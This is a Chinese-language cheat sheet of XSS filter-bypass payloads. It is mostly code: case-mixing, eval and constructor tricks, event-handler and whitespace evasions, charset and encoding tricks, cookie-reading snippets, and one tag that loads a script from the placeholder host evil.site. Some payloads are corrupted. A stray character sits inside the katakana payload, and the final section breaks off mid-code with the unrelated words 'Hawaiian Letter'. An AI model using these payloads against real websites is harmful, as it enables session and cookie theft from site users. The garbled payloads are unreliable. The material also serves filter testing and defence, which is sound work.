# XSS 过滤绕过

## 概述

- [大小写敏感的绕过](#bypass-case-sensitive)
- [标签黑名单的绕过](#bypass-tag-blacklist)
- [代码评估方式绕过词语黑名单](#bypass-word-blacklist-with-code-evaluation)
- [不完整HTML标签的绕过](#bypass-with-incomplete-html-tag)
- [字符串引号的绕过](#bypass-quotes-for-string)
- [脚本标签中引号的绕过](#bypass-quotes-in-script-tag)
- [鼠标按下事件中引号的绕过](#bypass-quotes-in-mousedown-event)
- [点过滤的绕过](#bypass-dot-filter)
- [字符串括号的绕过](#bypass-parenthesis-for-string)
- [括号和分号的绕过](#bypass-parenthesis-and-semi-colon)
- [onxxxx=黑名单的绕过](#bypass-onxxxx-blacklist)
- [空格过滤的绕过](#bypass-space-filter)
- [电子邮件过滤的绕过](#bypass-email-filter)
- [电话URI过滤的绕过](#bypass-tel-uri-filter)
- [文档黑名单的绕过](#bypass-document-blacklist)
- [document.cookie黑名单的绕过](#bypass-documentcookie-blacklist)
- [使用字符串内的JavaScript的绕过](#bypass-using-javascript-inside-a-string)
- [使用替代方式重定向的绕过](#bypass-using-an-alternate-way-to-redirect)
- [使用替代方式执行警报的绕过](#bypass-using-an-alternate-way-to-execute-an-alert)
- [使用空字符绕过">](#bypass--using-nothing)
- [使用＜和＞绕过使用＜和＞](#bypass--and--using--and-)
- [使用其他字符绕过";](#bypass--using-another-character)
- [使用缺失字符集头的绕过](#bypass-using-missing-charset-header)
- [使用HTML编码的绕过](#bypass-using-html-encoding)
- [使用片假名的绕过](#bypass-using-katakana)
- [使用楔形文字的绕过](#bypass-using-cuneiform)
- [使用隆塔拉字母的绕过](#bypass-using-lontara)
- [使用ECMAScript6的绕过](#bypass-using-ecmascript6)
- [使用八进制编码的绕过](#bypass-using-octal-encoding)
- [使用Unicode的绕过](#bypass-using-unicode)
- [使用UTF-7的绕过](#bypass-using-utf-7)
- [使用UTF-8的绕过](#bypass-using-utf-8)
- [使用UTF-16be的绕过](#bypass-using-utf-16be)
- [使用UTF-32的绕过](#bypass-using-utf-32)
- [使用BOM的绕过](#bypass-using-bom)
- [使用JSfuck的绕过](#bypass-using-jsfuck)
- [参考文献](#references)

## 绕过大小写敏感

为了绕过大小写敏感的XSS过滤器，可以尝试在标签或函数名称中混合大小写字母。

```javascript
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
```

由于许多XSS过滤器仅识别精确的小写或大写模式，这种方法有时可以规避简单大小写敏感过滤器的检测。

## 绕过标签黑名单

```javascript
<script x>
<script x>alert('XSS')<script y>
```

## 使用代码评估方式绕过词语黑名单

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

## 使用不完整HTML标签的绕过

适用于IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

## 绕过字符串引号

```javascript
String.fromCharCode(88,83,83)
```

## 脚本标签中引号的绕过

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

## 鼠标按下事件中引号的绕过

可以在鼠标按下事件处理程序中通过`&#39;`绕过单引号

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

## 点过滤的绕过

```javascript
<script>window['alert'](document['domain'])</script>
```

将IP地址转换为十进制格式：例如`http://192.168.1.1` == `http://3232235777`

```javascript
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

使用Linux命令对XSS有效载荷进行Base64编码：例如`echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

## 字符串括号的绕过

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

## 括号和分号的绕过

- 来自@garethheyes

    ```javascript
    <script>onerror=alert;throw 1337</script>
    <script>{onerror=alert}throw 1337</script>
    <script>throw onerror=alert,'some string',123,'haha'</script>
    ```

- 来自@terjanq

    ```js
    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
    ```

- 来自@cgvwzq

    ```js
    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
    ```

## 绕过onxxxx=黑名单

- 使用不太知名的标签

    ```html
    <object onafterscriptexecute=confirm(0)>
    <object onbeforescriptexecute=confirm(0)>
    ```

- 使用空字节/垂直制表符/回车/换行绕过onxxx=

    ```html
    <img src='1' onerror\x00=alert(0) />
    <img src='1' onerror\x0b=alert(0) />
    <img src='1' onerror\x0d=alert(0) />
    <img src='1' onerror\x0a=alert(0) />
    ```

- 使用'/'绕过onxxx=

    ```js
    <img src='1' onerror/=alert(0) />
    ```

## 空格过滤的绕过

- 使用'/'绕过空格过滤

    ```javascript
    <img/src='1'/onerror=alert(0)>
    ```

- 使用`0x0c/^L`或`0x0d/^M`或`0x0a/^J`或`0x09/^I`绕过空格过滤

  ```html
  <svgonload=alert(1)>
  ```

```ps1
$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

## 电子邮件过滤的绕过

- [符合RFC0822](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)

  ```javascript
  "><svg/onload=confirm(1)>"@x.y
  ```

- [符合RFC5322](https://0dave.ch/posts/rfc5322-fun/)

  ```javascript
  xss@example.com(<img src='x' onerror='alert(document.location)'>)
  ```

## 电话URI过滤的绕过

至少有两个RFC提到了`;phone-context=`描述符：

- [RFC3966 - 电话号码的tel URI](https://www.ietf.org/rfc/rfc3966.txt)
- [RFC2806 - 电话呼叫的URL](https://www.ietf.org/rfc/rfc2806.txt)

```javascript
+330011223344;phone-context=<script>alert(0)</script>
```

## 绕过文档黑名单

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
window["doc"+"ument"]
```

## 绕过document.cookie黑名单

这是另一种在Chrome、Edge和Opera中访问Cookie的方式。将`COOKIE NAME`替换为您想要的Cookie。如果您需要，还可以调查`getAll()`方法。

```js
window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
```

## 使用字符串内的JavaScript的绕过

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## 使用替代方式重定向的绕过

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

## 使用替代方式执行警报的绕过

来自[@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)的推文。

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

来自[@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - 使用全局变量

`Object.keys()` 方法返回给定对象自身属性名的数组，顺序与普通循环得到的一致。这意味着我们可以通过使用其**索引数字而不是函数名称**来访问任何JavaScript函数。

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

然后调用alert的方式是：

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

我们可以使用正则表达式如`^a[rel]+t$`来找到“alert”。

```javascript
// 将函数alert绑定到新函数a()
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 

// 然后你可以使用a()和Object.keys
self[Object.keys(self)[a()]]("1") // alert("1")
```

一行代码版本：

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

来自[@quanyang](https://twitter.com/quanyang/status/1078536601184030721)的推文。

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

来自[@404death](https://twitter.com/404death/status/1011860096685502464)的推文。

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

使用替代方式触发警报的绕过

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// 绕过了安全性
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

## 使用空字符绕过">"

无需关闭标签，浏览器会尝试修复它。

```javascript
<svg onload=alert(1)//
```

## 使用＜和＞绕过使用＜和＞

使用Unicode字符`U+FF1C`和`U+FF1E`，详见[Bypass using Unicode](#bypass-using-unicode)。

```javascript
＜script/src=//evil.site/poc.js＞
```

## 使用其他字符绕过";"

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

## 使用缺失字符集头的绕过

**要求**:

- 服务器头缺少`charset`: `Content-Type: text/html`

### ISO-2022-JP

ISO-2022-JP使用转义字符在几种字符集中切换。

| 转义    | 编码        |
|-----------|-----------------|
| `\x1B (B` | ASCII           |
| `\x1B (J` | JIS X 0201 1976 |
| `\x1B $@` | JIS X 0208 1978 |
| `\x1B $B` | JIS X 0208 1983 |

使用[代码表](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout)，我们可以发现多个字符在从**ASCII**切换到**JIS X 0201 1976**时会被转换。

| 十六进制  | ASCII | JIS X 0201 1976 |
| ---- | --- | --- |
| 0x5c | `\` | `¥` |
| 0x7e | `~` | `‾` |

**示例**:

使用`%1b(J`强制将`\`（ASCII）转换为`¥`（JIS X 0201 1976），取消引用引号。

有效载荷: `search=%1b(J&lang=en";alert(1)//`

## 使用HTML编码的绕过

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

## 使用片假名的绕过

使用[aemkei/Katakana](https://github.com/aemkei/katakana.js)库。

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+霍+ネ+'(-~ウ)')()
```

## 使用楔形文字的绕过

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## 使用隆塔拉字母的绕过

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ Hawaiian Letter